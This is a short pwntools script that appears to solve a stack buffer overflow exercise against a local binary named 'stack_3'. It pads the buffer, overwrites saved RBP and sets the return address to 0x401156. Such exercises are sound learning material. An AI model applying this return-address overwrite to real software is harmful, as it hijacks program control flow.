from pwn import *

# Start the process
p = process('./stack_3', level="debug")

# Payload
padding = b"AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPP"
rbp = b"12345678"
rip = p64(0x401156)
payload = padding + rbp + rip

# Send the input
p.sendline(payload)

# # Receive the output
output = p.recvall().decode()

# # Print the output
print(output)
